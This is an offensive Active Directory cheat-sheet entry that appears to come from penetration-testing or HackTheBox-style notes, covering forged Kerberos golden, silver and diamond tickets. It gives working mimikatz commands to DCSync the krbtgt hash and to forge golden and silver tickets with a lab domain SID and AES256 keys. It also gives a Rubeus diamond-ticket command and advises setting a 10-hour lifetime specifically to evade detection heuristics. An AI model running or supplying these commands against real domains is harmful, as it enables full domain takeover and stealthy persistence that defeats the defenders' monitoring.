# 15.11 Golden Silver Diamond Tickets

> Forge Golden (krbtgt), Silver (machine hash), or Diamond (modified-real) tickets — cap lifetime at 10h to dodge detection heuristics.

## Overview

Golden tickets forge TGTs using krbtgt's hash; silver tickets forge service tickets using a computer account hash. Diamond tickets modify a legitimate TGT with Rubeus, making them harder to detect. Set lifetime to 10 hours (not 10 years) to evade detection heuristics.

## Steps

- Obtain krbtgt hash via `mimikatz lsadump::dcsync /user:child\krbtgt`.
- Golden ticket: supply krbtgt AES256, domain SID, impersonated user, 10h lifetime.
- Silver ticket: supply target computer AES256, target machine, target service (cifs/HOST/etc), 10h lifetime.
- Diamond ticket (Rubeus): `diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<RID> /group:<RID> /krbkey:<AES256> /nowrap`.
- Verify access after ticket injection: `ls //dc01.child.htb.local/c$` or `klist`.

## Commands

### DCSync krbtgt

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:child\krbtgt" "exit"
```

### Create golden ticket

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "kerberos::golden /user:Administrator /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /aes256:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi" "exit"
```

### Create silver ticket (cifs to SRV01)

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "kerberos::golden /user:Administrator /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /target:srv01 /service:cifs /aes256:b358beae56d68a3713ac6ff800bfe60826444233f8bc9b1cbd7d0352405fab8f /startoffset:0 /endin:600 /renewmax:10080 /ticket:silver.kirbi" "exit"
```
